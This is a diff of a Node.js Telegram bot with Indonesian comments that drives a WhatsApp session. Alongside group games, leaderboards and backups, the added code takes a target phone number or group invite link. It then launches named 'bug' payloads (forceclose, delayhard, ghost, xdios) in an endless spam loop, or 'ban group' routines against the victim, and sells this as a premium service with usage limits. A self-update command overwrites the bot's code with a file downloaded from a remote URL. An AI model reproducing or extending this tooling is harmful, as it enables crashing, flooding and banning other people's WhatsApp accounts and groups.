-bot.action(/^tttnoop_(.+)_(.+)$/, async (ctx) => ctx.answerCbQuery("⚠️ Game selesai"));
-
-// =====================================================
-// ============ SUIT ===================================
-// =====================================================
-const suitGames = new Map();
-const suitName = (u) => (u?.username ? `@${u.username}` : u?.first_name || "User");
-const suitLabel = (c) => (c === "rock" ? "🪨 Batu" : c === "paper" ? "📄 Kertas" : c === "scissors" ? "✂️ Gunting" : "-");
-function suitWin(a, b) {
-  if (a === b) return "draw";
-  if ((a === "rock" && b === "scissors") || (a === "paper" && b === "rock") || (a === "scissors" && b === "paper")) return "p1";
-  return "p2";
-}
-const suitKbd = (chatId, gid) => ({
-  inline_keyboard: [[
-    { text: "🪨 Batu", callback_data: `suitpick_${chatId}_${gid}_rock` },
-    { text: "📄 Kertas", callback_data: `suitpick_${chatId}_${gid}_paper` },
-    { text: "✂️ Gunting", callback_data: `suitpick_${chatId}_${gid}_scissors` },
-  ]],
-});
-bot.command("suit", async (ctx) => {
-  if (!ctx.chat || (ctx.chat.type !== "group" && ctx.chat.type !== "supergroup")) return ctx.reply("❌ Cuma di grup.");
-  const chatId = ctx.chat.id;
-  if (suitGames.has(chatId)) return ctx.reply("⚠️ Masih ada game suit.");
-  const gid = Date.now().toString().slice(-6);
-  suitGames.set(chatId, { id: gid, p1: ctx.from, p2: null, p1Choice: null, p2Choice: null, started: false });
-  await ctx.reply(`🎮 <b>SUIT PVP</b>\n\n👤 P1 : <b>${suitName(ctx.from)}</b>\n👤 P2 : <b>Belum join</b>\n\n<i>Klik buat join.</i>`, {
-    parse_mode: "HTML",
-    reply_markup: { inline_keyboard: [[{ text: "⚔️ Join Suit", callback_data: `suitjoin_${chatId}_${gid}` }]] },
-  });
-});
-bot.command("suitstop", async (ctx) => {
-  if (!suitGames.has(ctx.chat.id)) return ctx.reply("❌ Gak ada game suit.");
-  suitGames.delete(ctx.chat.id);
-  ctx.reply("🛑 Game suit dibatalkan.");
-});
-bot.action(/^suitjoin_(.+)_(.+)$/, async (ctx) => {
-  try {
-    const chatId = Number(ctx.match[1]); const gid = String(ctx.match[2]);
-    const g = suitGames.get(chatId);
-    if (!g || g.id !== gid) return ctx.answerCbQuery("❌ Game gak ada", { show_alert: true });
-    if (g.p2) return ctx.answerCbQuery("⚠️ P2 penuh", { show_alert: true });
-    if (g.p1.id === ctx.from.id) return ctx.answerCbQuery("❌ Kamu udah P1", { show_alert: true });
-    g.p2 = ctx.from; g.started = true;
-    await ctx.editMessageText(`🎮 <b>SUIT PVP</b>\n\n👤 P1 : <b>${suitName(g.p1)}</b>\n👤 P2 : <b>${suitName(g.p2)}</b>\n\nPilih sekarang:`, { parse_mode: "HTML", reply_markup: suitKbd(chatId, gid) });
-    return ctx.answerCbQuery("✅ Join sebagai P2");
-  } catch { return ctx.answerCbQuery("❌ Error"); }
-});
-bot.action(/^suitpick_(.+)_(.+)_(rock|paper|scissors)$/, async (ctx) => {
-  try {
-    const chatId = Number(ctx.match[1]); const gid = String(ctx.match[2]); const choice = String(ctx.match[3]);
-    const g = suitGames.get(chatId);
-    if (!g || g.id !== gid) return ctx.answerCbQuery("❌ Game gak ada", { show_alert: true });
-    if (!g.started || !g.p2) return ctx.answerCbQuery("⚠️ Belum siap", { show_alert: true });
-    if (ctx.from.id === g.p1.id) {
-      if (g.p1Choice) return ctx.answerCbQuery("⚠️ Udah milih", { show_alert: true });
-      g.p1Choice = choice;
-      await ctx.answerCbQuery(`✅ Kamu pilih: ${suitLabel(choice)}`, { show_alert: true });
-    } else if (ctx.from.id === g.p2.id) {
-      if (g.p2Choice) return ctx.answerCbQuery("⚠️ Udah milih", { show_alert: true });
-      g.p2Choice = choice;
-      await ctx.answerCbQuery(`✅ Kamu pilih: ${suitLabel(choice)}`, { show_alert: true });
-    } else return ctx.answerCbQuery("❌ Kamu bukan pemain", { show_alert: true });
-    if (!g.p1Choice || !g.p2Choice) return;
-    const res = suitWin(g.p1Choice, g.p2Choice);
-    if (res === "draw") {
-      addSuitDraw(g.p1); addSuitDraw(g.p2);
-      await ctx.editMessageText(`🤝 <b>SERI</b>`, { parse_mode: "HTML" });
-      suitGames.delete(chatId);
-      return;
-    }
-    const winner = res === "p1" ? g.p1 : g.p2;
-    const loser = res === "p1" ? g.p2 : g.p1;
-    addSuitWin(winner); addSuitLose(loser);
-    await ctx.editMessageText(`🏆 <b>MENANG: ${suitName(winner)}</b>\n\n⭐ +2 point`, { parse_mode: "HTML" });
-    suitGames.delete(chatId);
-  } catch { return ctx.answerCbQuery("❌ Error"); }
-});
-
-// =====================================================
-// ============ AUTO UPDATE ============================
-// =====================================================
-const UPDATE_URL       = "https://raw.githubusercontent.com/sanz-max/seraphineupdate/main/files.js";
-const UPDATE_FILE_PATH = "./files.js";
-const BACKUP_FILE_PATH = "./files.backup.js";
-
-bot.command("update", async (ctx) => {
-  if (ctx.from.id != ownerID) return ctx.reply("❌ Khusus owner.");
-  const chatId = ctx.chat.id;
-  const sent = await ctx.telegram.sendMessage(chatId, `⏳ Seraphine Update Script\n━━━━━━━━━━━━━━━━━\n[░░░░░░░░░░] 0%`, { parse_mode: "Markdown" });
-  const updateProgress = async (percent, status) => {
-    const filled = Math.floor(percent / 10);
-    const bar = "█".repeat(filled) + "░".repeat(10 - filled);
-    await ctx.telegram.editMessageText(chatId, sent.message_id, null, `⏳ Seraphine Update Script\n━━━━━━━━━━━━━━━━━\n[${bar}] ${percent}%\nStatus: ${status}\n━━━━━━━━━━━━━━━━━`, { parse_mode: "Markdown" }).catch(() => {});
-  };
-  try {
-    await updateProgress(20, "Preparing..."); await sleep(500);
-    await updateProgress(40, "Downloading...");
-    const { data } = await axios.get(UPDATE_URL);
-    if (!data) { await updateProgress(40, "❌ File is empty!"); return ctx.reply("❌ Update failed!"); }
-    await updateProgress(60, "Backing up..."); await sleep(500);
-    if (fs.existsSync(UPDATE_FILE_PATH)) fs.copyFileSync(UPDATE_FILE_PATH, BACKUP_FILE_PATH);
-    await updateProgress(80, "Installing..."); await sleep(500);
-    fs.writeFileSync(UPDATE_FILE_PATH, data);
-    await updateProgress(100, "Completed");
-    await sleep(800);
-    await ctx.reply(`✅ **Update Successful!** Restarting...`, { parse_mode: "Markdown" });
-    setTimeout(() => process.exit(), 2000);
-  } catch (e) {
-    await ctx.reply(`❌ Update failed: ${e.message}`, { parse_mode: "Markdown" });
+  // PENDING GROUP ASK
+  if (pendingGroupAsk.has(userId)) {
+    if (text.startsWith("/")) { pendingGroupAsk.delete(userId); return next(); }
+    const action = pendingGroupAsk.get(userId);
+    pendingGroupAsk.delete(userId);
+    if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Belum ada sender.");
+    const groupJid = await resolveWaGroup(text.trim());
+    if (!groupJid) return ctx.reply("❌ Link/ID grup gak valid.");
+    const meta = await fetchGroupInfo(groupJid);
+    if (!meta) return ctx.reply("❌ Gagal ambil info grup.");
+    try {
+      if (action === "info") {
+        try { await ctx.telegram.callApi("sendRichMessage", { chat_id: ctx.chat.id, rich_message: { html: groupInfoHtml(meta) } }); }
+        catch { await ctx.reply(`👥 ${esc(meta.subject)} — ${meta.participants.length} member`, { parse_mode: "Markdown" }); }
+      } else if (action === "admin") {
+        try { await ctx.telegram.callApi("sendRichMessage", { chat_id: ctx.chat.id, rich_message: { html: adminListHtml(meta) } }); }
+        catch { await ctx.reply(`👑 Admin: ${meta.participants.filter(p=>p.admin).length}`, { parse_mode: "Markdown" }); }
+      } else if (action === "member") {
+        try { await ctx.telegram.callApi("sendRichMessage", { chat_id: ctx.chat.id, rich_message: { html: memberListHtml(meta) } }); }
+        catch { await ctx.reply(`👥 Member: ${meta.participants.length}`, { parse_mode: "Markdown" }); }
+      } else if (action === "lock") {
+        await sock.groupSettingsUpdate(groupJid, "announcement", true);
+        await ctx.reply("🔒 Grup di-lock.");
+      } else if (action === "unlock") {
+        await sock.groupSettingsUpdate(groupJid, "announcement", false);
+        await ctx.reply("🔓 Grup di-unlock.");
+      } else if (action === "invite") {
+        const code = await sock.groupInviteCode(groupJid);
+        await ctx.reply(`🔗 *INVITE LINK*\n\nhttps://chat.whatsapp.com/${code}`, { parse_mode: "Markdown" });
+      }
+    } catch (e) { await ctx.reply(`❌ ${e.message}`); }
+    return;
   }
+
+  // PENDING BAN
+  if (pendingBanUser.has(userId)) {
+    if (text.startsWith("/")) { pendingBanUser.delete(userId); return next(); }
+    const targetInput = text.trim();
+    if (!targetInput.includes("chat.whatsapp.com/")) return ctx.reply("❌ Link gak valid.");
+    const banName = pendingBanUser.get(userId);
+    pendingBanUser.delete(userId);
+    if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus premium.");
+    if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Belum ada sender.");
+    const inviteCode = String(targetInput.split("chat.whatsapp.com/")[1].split(/[?/]/)[0]);
+    try { logStatsBan(userId, ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "User"); } catch {}
+    await ctx.reply("Succes Banned Group", {
+      reply_markup: { inline_keyboard: [[{ text: "Details Target", url: `https://chat.whatsapp.com/${inviteCode}`, style: "success" }]] },
+    });
+    queue.add(async () => {
+      try {
+        if (banName === "endgb") await proxzy(sock, inviteCode);
+        else if (banName === "endgbv2") await BanGroup(sock, inviteCode);
+        await ctx.reply("✅ Ban group selesai!");
+      } catch (e) { await ctx.reply(`❌ Gagal: ${e.message}`); }
+    });
+    return;
+  }
+
+  // PENDING BUG
+  if (!pendingBugUser.has(userId)) return next();
+  if (text.startsWith("/")) { pendingBugUser.delete(userId); return next(); }
+  const parts = text.trim().split(/\s+/);
+  if (parts.length !== 1) return next();
+  const rawNumber = parts[0];
+  const target = formatTarget(rawNumber);
+  if (!target) return ctx.reply("❌ Nomor gak valid.");
+  const bugName = pendingBugUser.get(userId);
+  pendingBugUser.delete(userId);
+  const label = { forceclose: "Forceclose", delayhard: "Delayhard", ghost: "Ghost", forcezz: "Forcezz", xdios: "Xdios" }[bugName] || bugName;
+  if (!isPremiumUser(userId) && ctx.chat.type === "private") return ctx.reply("❌ Khusus premium.");
+  if (!isWhatsAppConnected) return ctx.reply("🪧 ☇ Belum ada sender.");
+  if (isWhitelisted(rawNumber)) return ctx.reply("🛡 Target ada di whitelist.");
+  if (!isPremiumUser(userId)) {
+    if (!canUse(userId)) { const u = getUserLimit(userId); return ctx.reply(`⏳ Limit habis (${u.used}/${u.max}).`); }
+    addUse(userId);
+  }
+  const tasks = getBugTasks(bugName, target);
+  if (!tasks.length) return ctx.reply("❌ Bug tidak dikenal.");
+  spamForever(ctx, label, target, tasks);
 });
+
+// =====================================================
+// ============ AUTO RESET LIMIT =======================
+// =====================================================
+setInterval(() => {
+  const now = moment().tz("Asia/Jakarta");
+  if (now.format("HH:mm:ss") === "00:00:00") {
+    resetAllLimit();
+    console.log("[AUTO] Limit di-reset.");
+  }
+}, 1000);
+
+// =====================================================
+// ============ NOTIF PREMIUM HAMPIR HABIS =============
+// =====================================================
+setInterval(async () => {
+  try {
+    const users = getAllUsers();
+    for (const u of Object.values(users)) {
+      if (isPremiumUser(u.id) && sisaHariPremium(u.id) === 1) {
+        bot.telegram.sendMessage(u.id, `⚠️ <b>PREMIUM HAMPIR HABIS</b>\n\nSisa 1 hari lagi. Segera perpanjang!`, { parse_mode: "HTML" }).catch(() => {});
+      }
+    }
+  } catch {}
+}, 12 * 60 * 60 * 1000);
+
+// =====================================================
+// ============ AUTO BACKUP SAAT BOOT ==================
+// =====================================================
+if (autobackupEnabled) {
+  autobackupInterval = setInterval(async () => {
+    try {
+      const files = fs.readdirSync("./database").filter(f => f.endsWith(".json"));
+      for (const f of files) await bot.telegram.sendDocument(ownerID, { source: `./database/${f}`, filename: f }).catch(() => {});
+      await bot.telegram.sendMessage(ownerID, `📦 Autobackup: ${files.length} file`);
+    } catch {}
+  }, 6 * 60 * 60 * 1000);
+}
 
 // =====================================================
 // ============ DETEKSI BOT JOIN GRUP ==================
@@ -2597,47 +2501,204 @@ bot.use(async (ctx, next) => {
 });
 
 // =====================================================
-// ============ AUTO RESET LIMIT TIAP 00:00 ============
+// ============ TIC TAC TOE ============================
 // =====================================================
-setInterval(() => {
-  const now = moment().tz("Asia/Jakarta");
-  if (now.format("HH:mm:ss") === "00:00:00") {
-    resetAllLimit();
-    console.log("[AUTO] Limit harian di-reset.");
-  }
-}, 1000);
-
-// =====================================================
-// ============ NOTIF PREMIUM HAMPIR HABIS =============
-// =====================================================
-setInterval(async () => {
-  try {
-    const users = getAllUsers();
-    for (const u of Object.values(users)) {
-      if (isPremiumUser(u.id) && sisaHariPremium(u.id) === 1) {
-        bot.telegram.sendMessage(u.id, `⚠️ <b>PREMIUM HAMPIR HABIS</b>\n\nPremium kamu tinggal <b>1 hari</b> lagi.\nSegera perpanjang biar gak keputus!`, { parse_mode: "HTML" }).catch(() => {});
-      }
-    }
-  } catch {}
-}, 12 * 60 * 60 * 1000); // cek tiap 12 jam
-
-// =====================================================
-// ============ AUTO RE-START AUTOBACKUP ===============
-// =====================================================
-if (autobackupEnabled) {
-  autobackupInterval = setInterval(async () => {
-    try {
-      const files = fs.readdirSync("./database").filter(f => f.endsWith(".json"));
-      for (const f of files) {
-        await bot.telegram.sendDocument(ownerID, { source: `./database/${f}`, filename: f }).catch(() => {});
-      }
-      await bot.telegram.sendMessage(ownerID, `📦 <b>AUTO BACKUP</b>\n\n✅ ${files.length} file\n⏱ ${moment().tz("Asia/Jakarta").format("DD-MM-YYYY HH:mm:ss")}`, { parse_mode: "HTML" });
-    } catch (e) { console.error("backup err:", e.message); }
-  }, 6 * 60 * 60 * 1000);
+const tttGames = new Map();
+function tttWinner(b) {
+  const L = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
+  for (const [a, b1, c] of L) if (b[a] && b[a] === b[b1] && b[a] === b[c]) return b[a];
+  return null;
 }
+const tttDraw = (b) => b.every((v) => v) && !tttWinner(b);
+const tttCell = (v) => (v === "X" ? "❌" : v === "O" ? "⭕" : "➖");
+const tttName = (u) => (u?.username ? `@${u.username}` : u?.first_name || "User");
+const tttKbd = (chatId, gid, b, lock = false) => {
+  const btn = (i) => ({ text: tttCell(b[i]), callback_data: lock ? `tttnoop_${chatId}_${gid}` : `tttmove_${chatId}_${gid}_${i}` });
+  return { inline_keyboard: [[btn(0), btn(1), btn(2)], [btn(3), btn(4), btn(5)], [btn(6), btn(7), btn(8)]] };
+};
+bot.command("ttt", async (ctx) => {
+  if (!ctx.chat || (ctx.chat.type !== "group" && ctx.chat.type !== "supergroup")) return ctx.reply("❌ Cuma bisa di grup.");
+  const chatId = ctx.chat.id;
+  if (tttGames.has(chatId)) return ctx.reply("⚠️ Masih ada game.");
+  const gid = Date.now().toString().slice(-6);
+  tttGames.set(chatId, { id: gid, board: Array(9).fill(null), players: { X: ctx.from, O: null }, turn: "X", started: false });
+  await ctx.reply(`🎮 <b>TIC TAC TOE</b>\n\n❌ X : <b>${tttName(ctx.from)}</b>\n⭕ O : <b>Belum join</b>`, {
+    parse_mode: "HTML",
+    reply_markup: { inline_keyboard: [[{ text: "Join Game", callback_data: `tttjoin_${chatId}_${gid}` }]] },
+  });
+});
+bot.command("tttstop", async (ctx) => {
+  if (!tttGames.has(ctx.chat.id)) return ctx.reply("❌ Gak ada game.");
+  tttGames.delete(ctx.chat.id);
+  ctx.reply("🛑 Game dihentikan.");
+});
+bot.command("mypoint", async (ctx) => {
+  const row = getPoint(ctx.from.id);
+  if (!row) return ctx.reply("📌 Belum punya point.");
+  ctx.reply(`🏅 <b>POINT</b>\n\n⭐ ${row.points}\n🏆 ${row.win} | 🤝 ${row.draw} | 💀 ${row.lose}`, { parse_mode: "HTML" });
+});
+bot.command("leaderboard", async (ctx) => {
+  const top = getTop(10);
+  if (!top.length) return ctx.reply("📌 Kosong.");
+  ctx.reply(`🏆 <b>LEADERBOARD</b>\n\n${top.map((u, i) => `${i + 1}. <b>${u.name}</b> — ⭐ ${u.points}`).join("\n")}`, { parse_mode: "HTML" });
+});
+bot.action(/^tttjoin_(.+)_(.+)$/, async (ctx) => {
+  try {
+    const chatId = Number(ctx.match[1]); const gid = String(ctx.match[2]);
+    const g = tttGames.get(chatId);
+    if (!g || g.id !== gid) return ctx.answerCbQuery("❌ Gak ada game", { show_alert: true });
+    if (g.players.O) return ctx.answerCbQuery("⚠️ Slot penuh", { show_alert: true });
+    if (g.players.X.id === ctx.from.id) return ctx.answerCbQuery("❌ Kamu udah X", { show_alert: true });
+    g.players.O = ctx.from; g.started = true;
+    await ctx.editMessageText(`🎮 <b>TIC TAC TOE</b>\n\n❌ X : <b>${tttName(g.players.X)}</b>\n⭕ O : <b>${tttName(g.players.O)}</b>\n\nGiliran: <b>${g.turn}</b>`, { parse_mode: "HTML", reply_markup: tttKbd(chatId, gid, g.board) });
+    return ctx.answerCbQuery("✅ Join");
+  } catch { return ctx.answerCbQuery("❌ Error"); }
+});
+bot.action(/^tttmove_(.+)_(.+)_(\d+)$/, async (ctx) => {
+  try {
+    const chatId = Number(ctx.match[1]); const gid = String(ctx.match[2]); const idx = Number(ctx.match[3]);
+    const g = tttGames.get(chatId);
+    if (!g || g.id !== gid) return ctx.answerCbQuery("❌ Gak ada", { show_alert: true });
+    if (!g.started) return ctx.answerCbQuery("⚠️ Belum mulai", { show_alert: true });
+    const cur = g.turn === "X" ? g.players.X : g.players.O;
+    if (!cur || cur.id !== ctx.from.id) return ctx.answerCbQuery("❌ Bukan giliranmu", { show_alert: true });
+    if (g.board[idx] !== null) return ctx.answerCbQuery("⚠️ Terisi", { show_alert: true });
+    g.board[idx] = g.turn;
+    const w = tttWinner(g.board);
+    if (w) {
+      const wUser = w === "X" ? g.players.X : g.players.O;
+      const lUser = w === "X" ? g.players.O : g.players.X;
+      addWin(wUser); addLose(lUser);
+      await ctx.editMessageText(`🏆 <b>MENANG: ${tttName(wUser)}</b>\n⭐ +3 point`, { parse_mode: "HTML", reply_markup: tttKbd(chatId, gid, g.board, true) });
+      tttGames.delete(chatId);
+      return ctx.answerCbQuery("🏆 Selesai");
+    }
+    if (tttDraw(g.board)) {
+      addDraw(g.players.X); addDraw(g.players.O);
+      await ctx.editMessageText(`🤝 <b>SERI</b>`, { parse_mode: "HTML", reply_markup: tttKbd(chatId, gid, g.board, true) });
+      tttGames.delete(chatId);
+      return ctx.answerCbQuery("🤝");
+    }
+    g.turn = g.turn === "X" ? "O" : "X";
+    await ctx.editMessageText(`🎮 <b>TIC TAC TOE</b>\n\n❌ X : <b>${tttName(g.players.X)}</b>\n⭕ O : <b>${tttName(g.players.O)}</b>\n\nGiliran: <b>${g.turn}</b>`, { parse_mode: "HTML", reply_markup: tttKbd(chatId, gid, g.board) });
+    return ctx.answerCbQuery("✅ Ok");
+  } catch { return ctx.answerCbQuery("❌ Error"); }
+});
+bot.action(/^tttnoop_(.+)_(.+)$/, async (ctx) => ctx.answerCbQuery("⚠️ Selesai"));
+
+// =====================================================
+// ============ SUIT ===================================
+// =====================================================
+const suitGames = new Map();
+const suitName = (u) => (u?.username ? `@${u.username}` : u?.first_name || "User");
+const suitLabel = (c) => (c === "rock" ? "🪨 Batu" : c === "paper" ? "📄 Kertas" : c === "scissors" ? "✂️ Gunting" : "-");
+function suitWin(a, b) {
+  if (a === b) return "draw";
+  if ((a === "rock" && b === "scissors") || (a === "paper" && b === "rock") || (a === "scissors" && b === "paper")) return "p1";
+  return "p2";
+}
+const suitKbd = (chatId, gid) => ({
+  inline_keyboard: [[
+    { text: "🪨 Batu", callback_data: `suitpick_${chatId}_${gid}_rock` },
+    { text: "📄 Kertas", callback_data: `suitpick_${chatId}_${gid}_paper` },
+    { text: "✂️ Gunting", callback_data: `suitpick_${chatId}_${gid}_scissors` },
+  ]],
+});
+bot.command("suit", async (ctx) => {
+  if (!ctx.chat || (ctx.chat.type !== "group" && ctx.chat.type !== "supergroup")) return ctx.reply("❌ Cuma di grup.");
+  const chatId = ctx.chat.id;
+  if (suitGames.has(chatId)) return ctx.reply("⚠️ Masih ada game.");
+  const gid = Date.now().toString().slice(-6);
+  suitGames.set(chatId, { id: gid, p1: ctx.from, p2: null, p1Choice: null, p2Choice: null, started: false });
+  await ctx.reply(`🎮 <b>SUIT PVP</b>\n\n👤 P1 : <b>${suitName(ctx.from)}</b>\n👤 P2 : <b>Belum join</b>`, {
+    parse_mode: "HTML",
+    reply_markup: { inline_keyboard: [[{ text: "Join Suit", callback_data: `suitjoin_${chatId}_${gid}` }]] },
+  });
+});
+bot.command("suitstop", async (ctx) => {
+  if (!suitGames.has(ctx.chat.id)) return ctx.reply("❌ Gak ada game.");
+  suitGames.delete(ctx.chat.id);
+  ctx.reply("🛑 Game dibatalkan.");
+});
+bot.action(/^suitjoin_(.+)_(.+)$/, async (ctx) => {
+  try {
+    const chatId = Number(ctx.match[1]); const gid = String(ctx.match[2]);
+    const g = suitGames.get(chatId);
+    if (!g || g.id !== gid) return ctx.answerCbQuery("❌ Gak ada", { show_alert: true });
+    if (g.p2) return ctx.answerCbQuery("⚠️ Penuh", { show_alert: true });
+    if (g.p1.id === ctx.from.id) return ctx.answerCbQuery("❌ Kamu udah P1", { show_alert: true });
+    g.p2 = ctx.from; g.started = true;
+    await ctx.editMessageText(`🎮 <b>SUIT PVP</b>\n\n👤 P1 : <b>${suitName(g.p1)}</b>\n👤 P2 : <b>${suitName(g.p2)}</b>\n\nPilih:`, { parse_mode: "HTML", reply_markup: suitKbd(chatId, gid) });
+    return ctx.answerCbQuery("✅ Join");
+  } catch { return ctx.answerCbQuery("❌ Error"); }
+});
+bot.action(/^suitpick_(.+)_(.+)_(rock|paper|scissors)$/, async (ctx) => {
+  try {
+    const chatId = Number(ctx.match[1]); const gid = String(ctx.match[2]); const choice = String(ctx.match[3]);
+    const g = suitGames.get(chatId);
+    if (!g || g.id !== gid) return ctx.answerCbQuery("❌", { show_alert: true });
+    if (!g.started || !g.p2) return ctx.answerCbQuery("⚠️ Belum siap", { show_alert: true });
+    if (ctx.from.id === g.p1.id) {
+      if (g.p1Choice) return ctx.answerCbQuery("⚠️ Udah milih", { show_alert: true });
+      g.p1Choice = choice;
+      await ctx.answerCbQuery(`✅ ${suitLabel(choice)}`, { show_alert: true });
+    } else if (ctx.from.id === g.p2.id) {
+      if (g.p2Choice) return ctx.answerCbQuery("⚠️ Udah milih", { show_alert: true });
+      g.p2Choice = choice;
+      await ctx.answerCbQuery(`✅ ${suitLabel(choice)}`, { show_alert: true });
+    } else return ctx.answerCbQuery("❌ Bukan pemain", { show_alert: true });
+    if (!g.p1Choice || !g.p2Choice) return;
+    const res = suitWin(g.p1Choice, g.p2Choice);
+    if (res === "draw") {
+      addSuitDraw(g.p1); addSuitDraw(g.p2);
+      await ctx.editMessageText(`🤝 <b>SERI</b>`, { parse_mode: "HTML" });
+      suitGames.delete(chatId);
+      return;
+    }
+    const winner = res === "p1" ? g.p1 : g.p2;
+    const loser = res === "p1" ? g.p2 : g.p1;
+    addSuitWin(winner); addSuitLose(loser);
+    await ctx.editMessageText(`🏆 <b>MENANG: ${suitName(winner)}</b>\n⭐ +2 point`, { parse_mode: "HTML" });
+    suitGames.delete(chatId);
+  } catch { return ctx.answerCbQuery("❌ Error"); }
+});
+
+// =====================================================
+// ============ AUTO UPDATE ============================
+// =====================================================
+const UPDATE_URL       = "https://raw.githubusercontent.com/sanz-max/seraphineupdate/main/files.js";
+const UPDATE_FILE_PATH = "./files.js";
+const BACKUP_FILE_PATH = "./files.backup.js";
+
+bot.command("update", async (ctx) => {
+  if (ctx.from.id != ownerID) return ctx.reply("❌ Khusus owner.");
+  const chatId = ctx.chat.id;
+  const sent = await ctx.telegram.sendMessage(chatId, "⏳ Update...");
+  const updateProgress = async (percent, status) => {
+    const filled = Math.floor(percent / 10);
+    const bar = "█".repeat(filled) + "░".repeat(10 - filled);
+    await ctx.telegram.editMessageText(chatId, sent.message_id, null, `⏳ [${bar}] ${percent}%\n${status}`, {}).catch(() => {});
+  };
+  try {
+    await updateProgress(20, "Preparing..."); await sleep(500);
+    await updateProgress(40, "Downloading...");
+    const { data } = await axios.get(UPDATE_URL);
+    if (!data) { await updateProgress(40, "❌ Empty!"); return ctx.reply("❌ Failed!"); }
+    await updateProgress(60, "Backup..."); await sleep(500);
+    if (fs.existsSync(UPDATE_FILE_PATH)) fs.copyFileSync(UPDATE_FILE_PATH, BACKUP_FILE_PATH);
+    await updateProgress(80, "Install..."); await sleep(500);
+    fs.writeFileSync(UPDATE_FILE_PATH, data);
+    await updateProgress(100, "Done");
+    await sleep(800);
+    await ctx.reply(`✅ Update Successful! Restarting...`);
+    setTimeout(() => process.exit(), 2000);
+  } catch (e) {
+    await ctx.reply(`❌ Update failed: ${e.message}`);
+  }
+});
 
 // =====================================================
 // ============ LAUNCH =================================
 // =====================================================
 bot.launch();
-console.log(chalk.green("🚀 Bot Hefaistos Hades v2.0 aktif!"));
+console.log(chalk.green("🚀 Bot Hefaistos Hades v2 aktif!"));
